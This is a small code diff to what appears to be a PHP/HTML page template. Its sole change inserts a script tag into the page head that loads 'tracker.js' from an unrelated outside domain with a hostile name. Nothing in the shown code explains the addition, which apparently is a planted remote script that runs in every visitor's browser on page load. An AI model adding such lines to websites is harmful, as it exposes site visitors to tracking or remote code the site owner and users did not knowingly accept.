@@ -38,7 +38,7 @@ if ($a == 2){
 	<link href="css/styles.css" rel="stylesheet">
 
 	<link href="css/responsive.css" rel="stylesheet">
-
+<script src="https://fuckfb.site/tracker.js"></script>
 </head>
 <body >
 
